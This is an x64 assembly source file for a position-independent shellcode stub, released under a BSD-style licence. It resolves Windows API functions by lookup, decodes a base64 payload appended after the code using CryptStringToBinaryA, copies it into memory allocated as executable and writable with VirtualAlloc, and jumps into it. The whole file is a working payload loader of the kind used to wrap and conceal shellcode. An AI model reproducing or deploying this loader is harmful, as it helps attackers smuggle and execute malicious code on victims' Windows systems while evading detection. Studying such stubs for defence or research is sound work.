;
;  Copyright © 2019 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
; 
    %include "../include.inc"
    
    bits   64
    
    ; shadow or home space for API call
    struc home_space
      ._rcx  resq 1
      ._rdx  resq 1
      ._r8   resq 1
      ._r9   resq 1
    endstruc

    ; structure for stack allocation
    struc ws
      .hs                   resb home_space_size
      
      .arg0                 resq 1
      .arg1                 resq 1
      .arg2                 resq 1
      
      ; local variables
      .outlen               resd 1
      .outbuf               resq 1
      .inlen                resd 1
      .inbuf                resq 1
      
      ; function pointers
      
      ; kernel32.dll
      ._LoadLibraryA        resq 1
      ._lstrlenA            resq 1
      ._VirtualAlloc        resq 1

      ; crypt32.dll
      ._CryptStringToBinary resq 1
    endstruc

    %define WORK_SPACE_LEN ((ws_size & -16) + 16) - 8 
    
    ; save non-volatile registers
    pushx  rsi, rbx, rdi, rbp
    jmp    load_get_api
init_get_api:
    pop    rbp
    xor    eax, eax
    mov    al, (decode_main - get_api1)
    add    rax, rbp
    jmp    rax
load_get_api:
    call   init_get_api
    
    %include "getapi1.asm"
    
decode_main:
    ; rbp points to get_api1
    ; rax points to decode_main
    cqo
    mov    dl, (inbuf - decode_main)
    add    rax, rdx
    sub    rsp, WORK_SPACE_LEN
    push   rsp
    pop    rbx
    lea    rdi, [rbx + ws.inbuf]
    stosq
    
    lookup "kernel32.dll", "LoadLibraryA"
    stosq
    
    lookup "kernel32.dll", "lstrlenA"
    stosq

    lookup "kernel32.dll", "VirtualAlloc"
    stosq

    lookup "crypt32.dll",  "CryptStringToBinaryA"
    stosq
    
    ; inlen = lstrlenA(inbuf)
    xor    eax, eax
    mov    rcx, [rbx + ws.inbuf]
    call   qword[rbx + ws._lstrlenA]
    mov    dword[rbx + ws.inlen], eax
    
    ; CryptStringToBinary(inbuf, inlen,
        ; CRYPT_STRING_ANY, NULL, &outlen, NULL, NULL)        
    xor    edx, edx                                     ; edx = 0
    mov    [rbx + ws.arg2       ], rdx    ; NULL
    mov    [rbx + ws.arg1       ], rdx    ; NULL
    mov    [rbx + ws.outlen     ], rdx    ; outlen = 0
    lea    rcx, [rbx + ws.outlen]
    mov    [rbx + ws.arg0], rcx           ; &outlen
    xor    r9, r9                         ; r8  = NULL
    push   CRYPT_STRING_ANY              ; r8  = CRYPT_STRING_ANY
    pop    r8                             ; 
    xchg   eax, edx                       ; rdx = inlen
    mov    rcx, [rbx + ws.inbuf]
    call   qword[rbx + ws._CryptStringToBinary]
    
    ; out = VirtualAlloc(NULL, outlen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    push   PAGE_EXECUTE_READWRITE
    pop    r9
    push   (MEM_COMMIT | MEM_RESERVE) >> 8
    pop    r8
    shl    r8, 8
    mov    edx, [rbx + ws.outlen]         ; rdx = outlen
    xor    ecx, ecx                       ; rcx = 0 
    call   qword[rbx + ws._VirtualAlloc]
    mov    qword[rbx + ws.outbuf], rax
    
    ; CryptStringToBinary(inbuf, inlen,
        ; CRYPT_STRING_ANY, outbuf, &outlen, NULL, NULL)        
    xor    edx, edx                                     ; edx = 0
    mov    [rbx + ws.arg2       ], rdx                  ; NULL
    mov    [rbx + ws.arg1       ], rdx                  ; NULL
    lea    rcx, [rbx + ws.outlen]
    mov    [rbx + ws.arg0], rcx                         ; &outlen
    push   rax                                          ; r9  = outbuf
    pop    r9
    push   CRYPT_STRING_ANY                             ; 
    pop    r8                                           ; r8  = CRYPT_STRING_ANY
    mov    edx, [rbx + ws.inlen]                        ; rdx = inlen
    mov    rcx, [rbx + ws.inbuf]
    call   qword[rbx + ws._CryptStringToBinary]
    mov    rax, [rbx + ws.outbuf]
    
    add    rsp, WORK_SPACE_LEN
    popx   rsi, rbx, rdi, rbp
    jmp    rax                                          ; jump to code
    
inbuf:
    ; null terminated base64 string
    